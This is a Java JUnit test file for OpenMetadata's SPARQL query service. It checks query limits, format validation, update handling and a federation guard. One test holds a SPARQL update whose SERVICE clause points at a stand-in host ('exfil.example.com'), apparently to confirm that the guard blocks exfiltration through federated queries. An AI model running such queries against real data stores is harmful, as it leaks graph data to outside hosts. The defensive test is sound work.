/*
 *  Copyright 2026 Collate
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *  http://www.apache.org/licenses/LICENSE-2.0
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */

package org.openmetadata.service.rdf;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertThrows;
import static org.junit.jupiter.api.Assertions.assertTrue;
import static org.mockito.ArgumentMatchers.anyString;
import static org.mockito.ArgumentMatchers.eq;
import static org.mockito.Mockito.mock;
import static org.mockito.Mockito.verify;
import static org.mockito.Mockito.verifyNoInteractions;
import static org.mockito.Mockito.when;

import org.junit.jupiter.api.Test;
import org.mockito.ArgumentCaptor;
import org.openmetadata.service.rdf.federation.SparqlFederationGuard;
import org.openmetadata.service.rdf.federation.SparqlFederationGuard.FederationDisallowedException;

class RdfSparqlServiceTest {

  @Test
  void executesAReadQueryWithTypedWireMetadata() {
    RdfRepository repository = mock(RdfRepository.class);
    String query = "SELECT * WHERE { ?subject ?predicate ?object }";
    when(repository.executeSparqlQuery(anyString(), eq("text/csv"))).thenReturn("subject\n");

    RdfSparqlService.QueryResult result = service(repository).query(query, "csv", "none");

    assertEquals("subject\n", result.body());
    assertEquals("csv", result.format());
    assertEquals("text/csv", result.mediaType());
    ArgumentCaptor<String> queryCaptor = ArgumentCaptor.forClass(String.class);
    verify(repository).executeSparqlQuery(queryCaptor.capture(), eq("text/csv"));
    assertTrue(queryCaptor.getValue().contains("LIMIT"));
    assertTrue(queryCaptor.getValue().contains("1000"));
  }

  @Test
  void preservesInferenceWarnings() {
    RdfRepository repository = mock(RdfRepository.class);
    String query = "SELECT * WHERE { ?subject ?predicate ?object }";
    when(repository.executeSparqlQueryWithInferenceResult(
            anyString(), eq("application/sparql-results+json"), eq("rdfs")))
        .thenReturn(new RdfRepository.InferenceQueryResult("{}", "limited inference"));

    RdfSparqlService.QueryResult result = service(repository).query(query, "json", "rdfs");

    assertEquals("limited inference", result.warning());
  }

  @Test
  void rejectsMalformedAndUpdateQueriesOnTheReadPath() {
    RdfRepository repository = mock(RdfRepository.class);

    assertThrows(
        IllegalArgumentException.class,
        () -> service(repository).query("not sparql", "json", "none"));
    assertThrows(
        IllegalArgumentException.class,
        () ->
            service(repository)
                .query(
                    "INSERT DATA { <urn:subject> <urn:predicate> <urn:object> }", "json", "none"));
  }

  @Test
  void validatesThenExecutesUpdates() {
    RdfRepository repository = mock(RdfRepository.class);
    String update = "INSERT DATA { <urn:subject> <urn:predicate> <urn:object> }";

    service(repository).update(update);

    verify(repository).executeSparqlUpdate(update);
  }

  @Test
  void rejectsDisallowedFederatedUpdatesBeforeRepositoryExecution() {
    final RdfRepository repository = mock(RdfRepository.class);
    final String update =
        "INSERT { ?subject <urn:copied> ?object } WHERE { "
            + "SERVICE <https://exfil.example.com/sparql> { ?subject ?predicate ?object } }";

    assertThrows(FederationDisallowedException.class, () -> service(repository).update(update));

    verifyNoInteractions(repository);
  }

  @Test
  void rejectsReadQueriesOnTheUpdatePath() {
    RdfRepository repository = mock(RdfRepository.class);

    assertThrows(
        IllegalArgumentException.class,
        () -> service(repository).update("SELECT * WHERE { ?subject ?predicate ?object }"));
  }

  @Test
  void ownsFormatAndInferenceValidationForEveryTransport() {
    RdfRepository repository = mock(RdfRepository.class);
    String graphQuery =
        "CONSTRUCT { ?subject ?predicate ?object } WHERE { ?subject ?predicate ?object }";
    when(repository.executeSparqlQuery(anyString(), eq("text/turtle"))).thenReturn("");

    RdfSparqlService.QueryResult result = service(repository).query(graphQuery, null, null);

    assertEquals("turtle", result.format());
    assertThrows(
        IllegalArgumentException.class, () -> service(repository).query(graphQuery, "csv", "none"));
    assertThrows(
        IllegalArgumentException.class,
        () ->
            service(repository)
                .query("SELECT * WHERE { ?subject ?predicate ?object }", "json", "invalid"));
  }

  @Test
  void rejectsOversizedQueriesAndResultLimits() {
    RdfRepository repository = mock(RdfRepository.class);
    String oversizedQuery = "#".repeat(SparqlQueryLimits.MAX_QUERY_CHARACTERS + 1);

    assertThrows(
        IllegalArgumentException.class,
        () -> service(repository).query(oversizedQuery, "json", "none"));
    assertThrows(
        IllegalArgumentException.class,
        () ->
            service(repository)
                .query(
                    "SELECT * WHERE { ?subject ?predicate ?object } LIMIT 10001", "json", "none"));
  }

  @Test
  void rejectsOversizedSerializedResults() {
    RdfRepository repository = mock(RdfRepository.class);
    when(repository.executeSparqlQuery(anyString(), eq("application/sparql-results+json")))
        .thenReturn("x".repeat(SparqlQueryLimits.MAX_OUTPUT_BYTES + 1));

    IllegalStateException exception =
        assertThrows(
            IllegalStateException.class,
            () ->
                service(repository)
                    .query("SELECT * WHERE { ?subject ?predicate ?object }", "json", "none"));

    assertTrue(exception.getMessage().contains("maximum response size"));
  }

  private static RdfSparqlService service(RdfRepository repository) {
    return new RdfSparqlService(repository, new SparqlFederationGuard(null));
  }
}
